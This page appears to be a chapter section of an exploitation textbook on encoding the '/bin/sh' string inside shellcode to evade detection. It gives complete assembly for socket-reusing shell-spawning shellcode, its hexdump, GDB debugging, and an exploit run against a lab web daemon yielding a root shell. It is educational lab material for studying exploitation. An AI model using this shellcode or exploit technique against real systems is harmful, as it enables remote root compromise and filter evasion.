<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x681 String Encoding</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part148.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part150.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark136">0x681 String Encoding</a></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">To hide the string, we will simply add 5 to each byte in the string. Then, after the string has been pushed to the stack, the shellcode will subtract 5 from each string byte on the stack. This will build the desired string on the stack so it can be used in the shellcode, while keeping it hidden during transit. The output below shows the calculation of the encoded bytes.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1099.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ echo &quot;/bin/sh&quot; | hexdump -C</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000000 2f 62 69 6e 2f 73 68 0a              |/bin/sh.|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000008</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q (gdb) print /x 0x0068732f + 0x05050505</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 0x56d7834</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) print /x 0x6e69622f + 0x05050505</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$2 = 0x736e6734</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">(gdb) quit reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1100.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;">The following shellcode pushes these encoded bytes to the stack and then decodes them in a loop. Also, two <span class="s31">int3 </span>instructions are used to put breakpoints in the shellcode before and after the decoding. This is an easy way to see what’s going on with GDB.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">encoded_sockreuserestore_dbg.s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1101.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">BITS 32</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">push BYTE 0x02  ; Fork is syscall #2. pop eax</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">int 0x80     ; After the fork, in child process eax == 0. test eax, eax</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">jz child_process ; In child process spawns a shell.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: 12pt;line-height: 107%;text-align: left;">; In the parent process, restore tinywebd. lea ebp, [esp+0x68] ; Restore EBP.</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">push 0x08048fb7   ; Return address. ret        ; Return</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">child_process:</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">; Re-use existing socket.</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 106%;text-align: left;">lea edx, [esp+0x5c]  ; Put the address of new_sockfd in edx. mov ebx, [edx]    ; Put the value of new_sockfd in ebx. push BYTE 0x02</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">pop ecx     ; ecx starts at 2. xor eax, eax</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">dup_loop:</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov BYTE al, 0x3F ; dup2 syscall #63 int 0x80     ; dup2(c, 0)</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">dec ecx     ; Count down to 0.</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">jns dup_loop   ; If the sign flag is not set, ecx is not negative.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: -12pt;line-height: 107%;text-align: left;">; execve(const char *filename, char *const argv [], char *const envp[]) mov BYTE al, 11  ; execve syscall #11</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">push 0x056d7834  ; push &quot;/sh\x00&quot; encoded +5 to the stack. push 0x736e6734  ; push &quot;/bin&quot; encoded +5 to the stack.</p><p class="s31" style="padding-left: 91pt;text-indent: 12pt;line-height: 212%;text-align: left;">mov ebx, esp   ; Put the address of encoded &quot;/bin/sh&quot; into ebx. int3 ; Breakpoint before decoding (REMOVE WHEN NOT DEBUGGING)</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">push BYTE 0x8  ; Need to decode 8 bytes pop edx</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">decode_loop:</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">sub BYTE [ebx+edx], 0x5 dec edx</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">jns decode_loop</p><p class="s31" style="padding-top: 2pt;padding-left: 104pt;text-indent: -12pt;line-height: 21pt;text-align: left;">int3 ; Breakpoint after decoding (REMOVE WHEN NOT DEBUGGING) xor edx, edx</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 8pt;text-align: left;">push edx     ; push 32-bit null terminator to stack.</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">mov edx, esp   ; This is an empty array for envp.</p><p class="s31" style="padding-top: 2pt;padding-left: 104pt;text-indent: 0pt;text-align: left;">push ebx     ; push string addr to stack above null terminator. mov ecx, esp   ; This is the argv array with string ptr.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 104pt;text-indent: 0pt;text-align: left;">int 0x80    ; execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;, NULL], [NULL])</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1102.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The decoding loop uses the EDX register as a counter. It begins at 8 and counts down to 0, since 8 bytes need to be decoded. Exact stack addresses don’t matter in this case since the important parts are all relatively addressed, so the output below doesn’t bother attaching to an existing tinywebd process.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1103.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -g tinywebd.c reader@hacking:~/booksrc $ sudo gdb -q ./a.out</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">warning: not using untrusted file &quot;/home/reader/.gdbinit&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. (gdb) set disassembly-flavor intel</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">(gdb) set follow-fork-mode child (gdb) run</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Starting program: /home/reader/booksrc/a.out Starting tiny web daemon..</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1104.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">Since the breakpoints are actually part of the shellcode, there is no need to set one from GDB. From another terminal, the shellcode is assembled and used with the socket-reusing exploit tool.</p><p class="s40" style="padding-top: 9pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">From Another Terminal</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1105.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ nasm encoded_sockreuserestore_dbg.s</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./xtool_tinywebd_reuse.sh encoded_socketreuserestore_dbg 127.0.0.1 target IP: 127.0.0.1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">shellcode: encoded_sockreuserestore_dbg (72 bytes) fake request: &quot;GET / HTTP/1.1\x00&quot; (15 bytes)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[Fake Request 15] [spoof IP 16] [NOP 313] [shellcode 72] [ret addr 128] [*fake_addr 8]</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">localhost [127.0.0.1] 80 (www) open</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1106.png"/></span></p><p style="padding-top: 7pt;padding-left: 86pt;text-indent: 0pt;text-align: center;">Back in the GDB window, the first <span class="s31">int3 </span>instruction in the shellcode is hit.</p><p style="padding-left: 7pt;text-indent: 0pt;text-align: center;">From here, we can verify that the string decodes properly.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1107.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Program received signal SIGTRAP, Trace/breakpoint trap. [Switching to process 12400]</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffff6ab in ?? () (gdb) x/10i $eip</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffff6ab:   push  0x8 0xbffff6ad:   pop  edx</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffff6ae:   sub  BYTE PTR [ebx+edx],0x5 0xbffff6b2:   dec  edx</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffff6b3:   jns  0xbffff6ae 0xbffff6b5   int3</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">0xbffff6b6:   xor   edx,edx 0xbffff6b8:   push  edx 0xbffff6b9:   mov   edx,esp 0xbffff6bb:   push  ebx (gdb) x/8c $ebx</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff738:   52 &#39;4&#39; 103 &#39;g&#39; 110 &#39;n&#39; 115 &#39;s&#39; 52 &#39;4&#39; 120 &#39;x&#39; 109 &#39;m&#39; 5 &#39;\005&#39;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">(gdb) cont Continuing.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[tcsetpgrp failed in terminal_inferior: Operation not permitted]</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Program received signal SIGTRAP, Trace/breakpoint trap. 0xbffff6b6 in ?? ()</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) x/8c $ebx</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff738:  47 &#39;/&#39; 98 &#39;b&#39; 105 &#39;i&#39; 110 &#39;n&#39; 47 &#39;/&#39; 115 &#39;s&#39; 104 &#39;h&#39; 0 &#39;\0&#39;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) x/s $ebx</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffff738:   &quot;/bin/sh&quot; (gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1108.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Now that the decoding has been verified, the <span class="s31">int3 </span>instructions can be removed from the shellcode. The following output shows the final shellcode being used.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1109.png"/></span></p><p class="s31" style="padding-top: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ sed -e &#39;s/int3/;int3/g&#39; encoded_sockreuserestore_dbg.s &gt; encoded_sockreuserestore.s</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ diff encoded_sockreuserestore_dbg.s encoded_sockreuserestore.s 33c33</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">&lt; int3 ; Breakpoint before decoding (REMOVE WHEN NOT DEBUGGING)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">&gt; ;int3 ; Breakpoint before decoding (REMOVE WHEN NOT DEBUGGING) 42c42</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt; int3 ; Breakpoint after decoding (REMOVE WHEN NOT DEBUGGING)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">&gt; ;int3 ; Breakpoint after decoding (REMOVE WHEN NOT DEBUGGING) reader@hacking:~/booksrc $ nasm encoded_sockreuserestore.s reader@hacking:~/booksrc $ hexdump -C encoded_sockreuserestore</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">00000000 6a 02 58 cd 80 85 c0 74 0a 8d 6c 24 68 68 b7 8f |j.X  t..l$hh..|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000010 04 08 c3 8d 54 24 5c 8b 1a 6a 02 59 31 c0 b0 3f |....T$\..j.Y1..?|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000020 cd 80 49 79 f9 b0 0b 68 34 78 6d 05 68 34 67 6e |..Iy. h4xm.h4gn|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000030 73 89 e3 6a 08 5a 80 2c 13 05 4a 79 f9 31 d2 52 |s..j.Z.,..Jy.1.R|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000040 89 e2 53 89 e1 cd 80                |..S  |</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000047</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./tinywebd Starting tiny web daemon..</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./xtool_tinywebd_reuse.sh encoded_sockreuserestore 127.0.0.1 target IP: 127.0.0.1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">shellcode: encoded_sockreuserestore (71 bytes) fake request: &quot;GET / HTTP/1.1\x00&quot; (15 bytes)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[Fake Request 15] [spoof IP 16] [NOP 314] [shellcode 71] [ret addr 128] [*fake_addr 8]</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">localhost [127.0.0.1] 80 (www) open whoami</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">root</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1110.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part148.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part150.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
